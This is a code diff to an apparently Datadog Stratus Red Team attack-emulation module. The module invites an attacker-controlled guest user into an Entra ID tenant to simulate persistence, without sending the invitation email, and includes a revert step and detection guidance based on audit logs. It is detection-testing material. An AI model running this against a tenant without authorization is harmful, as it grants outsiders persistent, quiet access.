@@ -5,9 +5,12 @@ import (
 	_ "embed"
 	"errors"
 	"fmt"
+	"github.com/aws/smithy-go/ptr"
 	entra_id_utils "github.com/datadog/stratus-red-team/v2/internal/utils/entra_id"
 	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
 	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
+	"github.com/microsoftgraph/msgraph-beta-sdk-go/models"
+	graphcore "github.com/microsoftgraph/msgraph-sdk-go-core"
 	graphmodels "github.com/microsoftgraph/msgraph-sdk-go/models"
 	"log"
 	"strings"
@@ -18,18 +21,16 @@ const AttackTechniqueId = "entra-id.persistence.guest-user"
 
 func init() {
 	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
-		ID:           "entra-id.persistence.guest-user",
-		FriendlyName: "Create Guest User for Persistent Access",
+		ID:           AttackTechniqueId,
+		FriendlyName: "Create Guest User",
 		Description: `
-An attacker can abuse the Guest User invite process to gain persistent access to an environment, as they can invite themselves as a guest.
+Invites an external guest user in the tenant.
 
-Warm-up:
-
-- N/A, this technique does not have a warm-up stage
+Warm-up: None
 
 Detonation:
 
-- Invite Guest User
+- Invite guest user (without generating an invitation email)
 
 References:
 
@@ -49,11 +50,11 @@ References:
 	` + codeBlock + `
 `,
 		Detection: `
-When someone invites a guest user in Entra ID, several events are logged in the Entra ID Activity logs:
+Using [Entra ID audit logs](https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-audit-logs) with the specific activity types:
 
-<code>Add user</code>
-<code>Invite external user</code>
-<code>Add user sponsor</code>
+- <code>Add user</code>
+- <code>Invite external user</code>
+- <code>Add user sponsor</code>
 
 When the invited user accepts the invite, an additional event <code>Redeem external user invite</code> is logged. 
 
@@ -116,38 +117,38 @@ Sample events, shortened for clarity:` + codeBlock + `
 	})
 }
 
-func detonate(params map[string]string, providers stratus.CloudProviders) error {
-	//graphClient setup
+func detonate(_ map[string]string, providers stratus.CloudProviders) error {
 	graphClient := providers.EntraId().GetGraphClient()
 	attackerPrincipal := entra_id_utils.GetAttackerPrincipal()
 
-	// Fetch Tenant Id
-	organization, err := graphClient.Organization().Get(context.Background(), nil)
+	// Retrieve tenant ID
+	tenantId, err := providers.EntraId().GetTenantId()
 	if err != nil {
-		return errors.New("could not get tenant ID: " + err.Error())
+		return errors.New("could not retrieve tenant ID: " + err.Error())
 	}
 
-	tenantId := organization.GetValue()[0].GetId()
-
 	// Invite Guest User
+	log.Println("Inviting guest user " + attackerPrincipal + ", this can take a few seconds...")
 	requestBody := graphmodels.NewInvitation()
 	invitedUserEmailAddress := attackerPrincipal
 	requestBody.SetInvitedUserEmailAddress(&invitedUserEmailAddress)
-	inviteRedirectUrl := fmt.Sprintf("https://myapplications.microsoft.com/?tenantid=%s", *tenantId)
+	requestBody.SetSendInvitationMessage(ptr.Bool(false)) // Don't send the invitation message
+	inviteRedirectUrl := fmt.Sprintf("https://myapplications.microsoft.com/?tenantid=%s", tenantId)
 	requestBody.SetInviteRedirectUrl(&inviteRedirectUrl)
 
-	_, err = graphClient.Invitations().Post(context.Background(), requestBody, nil)
+	response, err := graphClient.Invitations().Post(context.Background(), requestBody, nil)
 
 	if err != nil {
 		return errors.New("could not invite user: " + err.Error())
 	}
 
-	log.Printf("Invited %s as guest user", attackerPrincipal)
+	log.Println("Successfully invited guest user " + attackerPrincipal + " in the tenant")
+	log.Println("To simulate accepting the invite, you can visit the following URL from an incognito browsing session: " + *response.GetInviteRedeemUrl())
 
 	return nil
 }
 
-func revert(params map[string]string, providers stratus.CloudProviders) error {
+func revert(_ map[string]string, providers stratus.CloudProviders) error {
 	// Initialize Graph client
 	graphClient := providers.EntraId().GetGraphClient()
 	attackerPrincipal := entra_id_utils.GetAttackerPrincipal()
@@ -159,13 +160,29 @@ func revert(params map[string]string, providers stratus.CloudProviders) error {
 		return errors.New("could not retrieve users: " + err.Error())
 	}
 
+	// We need to paginate through the results
 	var userId string
-	for _, user := range userResult.GetValue() {
+	iterator, err := graphcore.NewPageIterator[*graphmodels.User](userResult, graphClient.GetAdapter(), models.CreateUserCollectionResponseFromDiscriminatorValue)
+	if err != nil {
+		return errors.New("could not create users iterator: " + err.Error())
+	}
+
+	err = iterator.Iterate(context.Background(), func(user *graphmodels.User) bool {
 		userPrincipal := *user.GetUserPrincipalName()
 		if strings.Contains(userPrincipal, attackerPrefix[0]) {
 			userId = *user.GetId()
-			break
+			return false // stop iterating
 		}
+		return true // continue iterating
+	})
+	if err != nil {
+		return errors.New("could not iterate over users: " + err.Error())
+	}
+
+	if userId == "" {
+		log.Println("could not find guest user " + attackerPrincipal + " in the tenant, maybe you removed it manually?")
+		log.Println("assuming the user was already removed and there's nothing left to revert")
+		return nil
 	}
 
 	// 2. Delete Guest User
@@ -174,7 +191,7 @@ func revert(params map[string]string, providers stratus.CloudProviders) error {
 		return errors.New("could not delete guest user: " + err.Error())
 	}
 
-	log.Printf("Deleted guest user %s", attackerPrincipal)
+	log.Println("Deleted guest user " + attackerPrincipal)
 
 	return nil
 }
